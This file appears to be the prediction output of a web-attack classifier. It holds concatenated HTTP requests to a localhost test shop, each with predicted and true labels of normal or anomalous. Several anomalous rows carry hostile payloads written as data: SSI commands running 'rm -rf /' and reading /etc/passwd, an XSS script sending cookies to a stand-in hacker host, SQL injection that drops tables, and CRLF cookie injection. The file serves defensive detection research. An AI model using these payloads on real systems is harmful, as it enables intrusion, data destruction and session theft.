data,y_pred,y_test
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidada=20&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito| posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6346&b1a=confirmar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yansun&pwd=03s6ig89<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jilann6&password=inna&nombre=hipabia&apellidos=salvatierra+escala&email=sangareau@faders.com.mil&dni=80061275t&direccion=barriada+de+la+doctora+15+&ciudad=agaete&cp=23450&provincia=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&ntc=4825239492507549&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/ posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=588&b1a=pasar+por+caja posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=plsntp1&password=c!uartilludo&nombre=generosa&apellidos=obrador+scolari&email=metanee4@martosfutbolsala.us&dni=55023331v&direccion=cuesta+de+la+independencia+107+7?h&ciudad=bastida,+la&cp=50268&provincia=guadalajara&ntc=7559315491846404sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp/6909030637832563290.jsp.bak gethttp://localhost:8080/tienda1/index.jsp.bak",anomalous,anomalous
gethttp://localhost:8080/admin/logon.jsp puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1510&b1=confirmar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yeirnie9&pwd=41tt8&remembera=on&b1=entrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/mail.box,normal,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3%2b&nombre=vino+rioja&precio=39&cantidad=41&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=katja&password=habilitador&nombre=bastian&apellidos=urigoiti+unzaga&email=navartil@soyandaluz.va&dni=78433382r&direccion=passatge+cala+ratjada+127,+&ciudad=hontoria+del+pinar&cp=50142&provincia=/?seg+ovia&ntc=6142248987618034&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=olson&password=confesur�a&nombre=aberardo&apellidos=segovia&email=raya@acumulador.com.iq&dni=06076324t&direccion=calle+rio+pisuerga+34+&ciudad=marug�n&cp=15589&provincia=lleida&ntc=0903154438828489&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=9379&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nataniel&password=53rd11c4&nombre=ligia&apellidos=klindt+vanega&email=cordon4@hojainformativas.je&dni=96785368b&direccion=pintor+clemente+de+torres+169+&ciudad=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&cp=09125&provincia=guadalajara&ntc=2447487443590870&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6276""><!--#exec+cmd=""dir+""--><&b1=confirmar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6195&b1=pasar+por+caja/ gethttp://localhost:8080/patient/login.do",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas';waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=des9i852d268&remember=on/&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5289&b1=pasar+por+caja');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2939&b1=pasar+por+caja/,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/4861362529278789730.inc gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yansun&pwd=03s6ig89<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=messier&password=c7b183o&nombre=nicodemo&apellidos=nog*ueira+aguayo&email=galloway@rtce.gu&dni=35507822p&direccion=numero+15,+151,+&ciudad=castrillo+de+la+guare�a&cp=23657&provincia=toledo&ntc=1278501676319264&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1328&b1=confirmar/",anomalous,anomalous
"gethttp://localhost:8080/tienda1/imagenes/2.gif.old gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=ques+o+manchego&precio=85&cantidad=4&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=souba&password=duomesina&nombre=macedonia&apellidos=paul?lada/+subir?ana&email=motaung@hojainformativas.com.ee&dni=71823012s&direccion=c/+el+rubio,+155,+&ciudad=ciempozuelos&cp=13100&provincia=la+rioja&ntc=9142922555236896&b1=registrar gethttp://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=1400&b1=pasar+por+caja gethttp://localhost:8080.inc gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dajerlin&password=3o172a1i0m6n19&nombre=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&apellidos=bordas+rubies&email=carves@travelzone.hn&dni=59561138q&direccion=calle+morera,+139,+8g&ciudad=funes&cp=17143&provincia=toledo&ntc=9899066630450137&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fallah&password=sindicable&nombre=fabia&apellidosa=rom�+subir�n&email=segar@contactomujeres.nc&dni=64964263g&direccion=ortiz+de+zarate+32,+&ciudad=petrer&cp=49331&provincia=badajoz&ntc=5495554937258640&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/asf-logo-wide gethttp://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%3f gethttp://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dal'li&password=4107nd�&nombre=shunko&apellidos=brio+bertorelli&email=griffen7@docerosas.no&dni=71766334d&direccion=calle+gitanillos+de+cadiz+96+2?h&ciudad=cala�as&cp=24234&provincia=palencia&ntc=5502025847715337&b1=registrar,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4320&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shimiz&password=m5x0e&nombre=nimsi&apellidos=cat�+viera&email=talbot_polani@clichotel.sj&dni=56967582d&direccion=avenida+industria+48,+12h&ciudad=sant+mart�+de+riucorb&cp=44124&provincia=zaragoza&ntc=5246598463194503&b1=+ gethttp://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp gethttp://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=46&b1=a�adir+al+carrito",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp.bak gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=<!--#include+file=""archivo_secreto""+-->&b1=confirmar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob@<script>alert(paros)</script>.parosproxy.org posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100&cantidad=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&b1=a�adir+al+carrito",anomalous,anomalous
gethttp://localhost:8080/servlet/simpleservlet posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob@<script>alert(paros)</script>.parosproxy.org&pwd=�12�a&remember=on&b1=entrar gethttp://localhost:8080/ibmwebas gethttp://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif/ gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%2b,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lrcrichany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a&pwd=veguer�a&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=9089&b1=pasar+por+caja posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=huntlee&password=da.mer�a&nombre=abundio&apellidos=vendrells+unda&email=goetz-pongnati@itrends.tt&dni=80216747s&direccion=calle+francisco+de+diego,+83+1-h&ciudad=moeche&cp=04897&provincia=valladolid&ntc=714689639778546a&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gerhardt8&password=pizmie+nta&nombre=yamila&apellidos=cardalliaguet+yescas&email=armantel@laspruebascongaseosa.vg&dni=65724136a&direcciona=castro+canseco+8+5?h&ciudad=oria&cp=17538&provincia=albacete&ntc=2877016523183053&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5521&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=arjun1&password=lan$�a&nombre=|&apellidos=tirado+paulet&email=arlen@cienciapolicial.va&dni=61317153g&direccion=gongora,+129+&ciudad=gabiria&cp=13333&provincia=segovia&ntc=6277517976007301&b1=registrar gethttp://localhost:8080/tienda1/asf-logo-wide~ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rosalyn&password=0m84n750&nombre=jeannette+amelie&apellidos=esguevillas+abizanda&email=janda@sayuela.aw&dni=04452062k&direccion=calle+carassa+117,+&ciudad=galinduste&cp=16268&provinciaa=a+coru�a&ntc=8900090922020406&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=levon&pwd=ca�ucela&remember=on&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.bak gethttp://localhost:8080/tienda1/publico/vaciar.jsp.inc gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6090&b1=confirmar/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kingston&password=trasplante&nombre=johana&apellidos=""><!--#exec+cmd=""dir+""--><&email=lobe-cary@videoerotic.mh&dni=86807165j&direccion=calle+olof+palme+s/n,+&ciudad=navezuelas&cp=44330&provincia=navarra&ntc=4852910314860020&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heinonen&pwd=s+oso&remember=on&b1=entrarany%0aset-cookie%3a+tamper%3d1041264011025374727",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vivier&pwd=p32'/,5i5a&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7525?&b1=confirmar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/6909030637832563290.jsp.inc gethttp://localhost:8080/iissamples/exair/howtoreachus.asp gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1",anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.gif/~ gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.old posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=gamaliel&pwd=embelesar&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=854&b1=pasar+por+caja,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=100&cantidad=7&b1=a�adir+al+carrito gethttp://localhost:8080/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=erdem&password=verd7ma3&nombre=zinedine&apellidos=terzano+revert�&email=%7c&dni=58018464k&direccion=c/+alondra,+134,+10?c&ciudad=pu�rtolas&cp=33070&provincia=guadalajara&ntc=4378749164701036&b1=registrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas puthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='or'a='a gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&passworda=mane79&nombre=lihuen&apellidos=bibiloni+urdi&email=brion@baybay.gi&dni=00508069e&direccion=gerona+89+&ciudad=olocau+del+rey&cp=16122&provincia=valladolid&ntc=2304911329453006&b1=registrar,anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/4861362529278789730 gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito@40 posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6471&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85/&cantidad=69&b1=a�adir+al+carrito,normal,anomalous
"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=""><!--#exec+cmd=""dir+""--><&precio=100&cantidad=15&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp.old posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+.*?rioja&precio=85&cantidad=74&b1=a�adir+al+carrito gethttp://localhost:8080/_cti_pvt/writeto.cnf gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=klasky&password=tem.�tico&nombre=licia&apellidos=maeso+comello&email=verrell.myral@cafedeteatro.kh&dni=33908887xany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&direccion=plaza+pedro+marcos,+145+&ciudad=guadalupe&cp=36700&provincia=c�diz&ntc=4984450191632548&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=100&cantidad=15&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mueller&password=env94e8cimi2n27&nombre=lihue&apellidos=ache&email=set-cookie%3a+tamper%3d1041264011025374727&dni=47828836z&direccion=dacil+vilar+borges+197,+&ciudad=valle+de+tobalina&cp=09611&provincia=almer�a&ntc=7390983660334411&b1=registrar gethttp://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif.inc gethttp://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif.inc gethttp://localhost:8080/tienda1/publico/asf-logo-wide.bak",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=fargo&pwd=engolfa&remember=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&b1=entrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/samples/dbsamp/dbsamp.htm gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rajchwal&pwda=supletorio&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5781&b1a=pasar+por+caja posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=@40&b1=a�adir+al+carrito gethttp://localhost:8080/samples/sampsite/dfault.htm puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bonnar&password=perillana&nombre=benito&apellidos=estruga+barrozzi&email=offerall@eonon.com.ci&dni=78627299m&direccion=poetisa+rosalia+de+castro,+41,+3?e&ciudad=valhermoso+de+la+fuente&cp=24174&provincia=cuenca&ntc=3588478670456559&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif gethttp://localhost:8080/tienda1/imagenes/3.gif gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=26&b1=a�adir+al+carrito,normal,normal
gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg gethttp://localhost:8080/tienda1/miembros/index.jsp gethttp://localhost:8080/tienda1/miembros/fotos.jsp posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,normal,normal
gethttp://localhost:8080/tienda1/imagenes/logo.gif gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=paley&password=contrariosa&nombre=romarico&apellidos=mastache+comapla&email=koleskidy@manjarr.ps&dni=23291292c&direccion=calle+cantos+negros+150+&ciudad=piedras+albas&cp=01719&provincia=almer�a&ntc=3175397567040813&b1=registrar gethttp://localhost:8080/tienda1/miembros/fotos.jsp gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,normal,normal
"gethttp://localhost:8080/tienda1/publico/miembros.jsp gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=felike&password=alcacil&nombre=derio&apellidos=bernaus&email=thunder@bodasconmusica.pm&dni=56876281h&direccion=av.+jose+ferrandez+cruz+182,+8b&ciudad=palacios+del+pan&cp=19140&provincia=�vila&ntc=1646326838248937&b1=registrar gethttp://localhost:8080/tienda1/global/creditos.jsp",normal,normal
"gethttp://localhost:8080/tienda1/miembros/index.jsp gethttp://localhost:8080/tienda1/miembros/index.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=raymona&password=8ho0l2&nombre=torcuarto&apellidos=pompa&email=maksimovic@gafasdesol.nom.gl&dni=48748000y&direccion=port+fangos,+183,+&ciudad=cualedro&cp=31153&provincia=granada&ntc=9528500439395561&b1=registrar",normal,normal
posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=daisey&pwd=r92e1*56e&remember=on&b1=entrar gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=13&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1972&b1=pasar+por+caja,normal,normal
"gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=adamson&password=sed4e748&nombre=telly&apellidos=sol�s+galcera&email=topham.sperdakos5@forohh.ge&dni=75730563g&direccion=josep+anselm+clave,+169,+13?d&ciudad=villasandino&cp=47609&provincia=cuenca&ntc=9795489618459865&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=petunia&pwd=abieldar&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=72&b1=a�adir+al+carrito",normal,normal
gethttp://localhost:8080/tienda1/publico/miembros.jsp gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2742&b1=pasar+por+caja gethttp://localhost:8080/tienda1/miembros/salir.jsp posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 gethttp://localhost:8080/tienda1/publico/carrito.jsp,normal,normal
"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pisani&password=carson&nombre=mae&apellidos=llambric+acebron&email=sterland@zingtonos.vg&dni=15819331t&direccion=c/+irmans+carro+s/n,+&ciudad=go�i&cp=46529&provincia=guadalajara&ntc=6162508820566713&b1=registrar gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg",normal,normal
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=melucci&password=f�nico&nombre=selene&apellidos=jaraba+villa&email=berba.andreguy4@campanasextractoras.sh&dni=18653468p&direccion=microscopio,+65+&ciudad=segura&cp=34870&provincia=m�laga&ntc=4102716313272060&b1=registrar gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg gethttp://localhost:8080/tienda1/global/creditos.jsp gethttp://localhost:8080/tienda1/global/estilos.css",normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=973&b1=confirmar gethttp://localhost:8080/tienda1/imagenes/logo.gif gethttp://localhost:8080/tienda1/imagenes/1.gif gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cang&pwd=poderdante&remember=off&b1=entrar,normal,normal
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5555&b1=confirmar gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=thum&password=l655a2uta&nombre=belisaria&apellidos=kerber+frola&email=mccaffria_malanowicz@fbi-criminal-network.com.mr&dni=49210905j&direccion=calle+miquel+santandreu+66,+&ciudad=alpedrete&cp=25597&provincia=�vila&ntc=2967806020727366&b1=registrar gethttp://localhost:8080/tienda1/imagenes/3.gif posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=39&cantidad=15&b1=a�adir+al+carrito",normal,normal
gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39&cantidad=94&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/imagenes/2.gif posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=58&b1=a�adir+al+carrito,normal,normal
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lauraine&password=desapercib.idamente&nombre=adelmar&apellidos=oti�a&email=weldon@latiendadecolchones.ec&dni=09824561l&direccion=antonio+asenjo,+178,+6?h&ciudad=cambil&cp=09493&provincia=c�diz&ntc=8365998592191509&b1=registrar gethttp://localhost:8080/tienda1/imagenes/3.gif gethttp://localhost:8080/tienda1/publico/productos.jsp gethttp://localhost:8080/tienda1/imagenes/logo.gif posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1947&b1=confirmar",normal,normal
posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5829&b1=pasar+por+caja gethttp://localhost:8080/tienda1/global/menum.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,normal,normal
gethttp://localhost:8080/tienda1/miembros/fotos.jsp posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=irissou&password=ceg.ama&nombre=no�&apellidos=esp�ndola+pavajeau&email=heal@quadernideilgarda.gob&dni=19187311k&direccion=hartzenbusch+98+&ciudad=sagunto/sagunt&cp=45314&provincia=baleares+(illes)&ntc=8622247853302054&b1=registrar gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoek&password=p80roq37a&nombre=arnold&apellidos=gamero+piquer&email=kania@internacionalexpofloralzaragoza2014.se&dni=60219106t&direccion=c/+david+169+6-h&ciudad=alpanseque&cp=34491&provincia=soria&ntc=6052575458903968&b1=registrar gethttp://localhost:8080/tienda1/publico/miembros.jsp,normal,normal
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=972&b1=pasar+por+caja gethttp://localhost:8080/tienda1/global/estilos.css gethttp://localhost:8080/tienda1/global/titulo.jsp gethttp://localhost:8080/tienda1/publico/productos.jsp gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=luna&password=2un4141ali46r&nombre=ado&apellidos=macuare+ribes&email=embree_chevret@softwaremasservicio.bs&dni=59388065h&direccion=c/+violeta,+s/n+9-b&ciudad=ingenio&cp=40290&provincia=navarra&ntc=7144713031308851&b1=registrar",normal,normal
gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg gethttp://localhost:8080/tienda1/publico/carrito.jsp gethttp://localhost:8080/tienda1/imagenes/1.gif gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif gethttp://localhost:8080/tienda1/publico/productos.jsp,normal,normal
gethttp://localhost:8080/tienda1/global/creditos.jsp gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4358&b1=pasar+por+caja gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8912&b1=pasar+por+caja gethttp://localhost:8080/tienda1/imagenes/logo.gif,normal,normal
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 gethttp://localhost:8080/tienda1/miembros/index.jsp posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=suany&password=c6he5era&nombre=raimondo&apellidos=landau+silvestre&email=baigent@blueberryminiloaf.com.dj&dni=83178933p&direccion=c/+cels+gomis+i+mestre+171,+&ciudad=celadas&cp=09227&provincia=toledo&ntc=6091962407544317&b1=registrar gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg",normal,normal
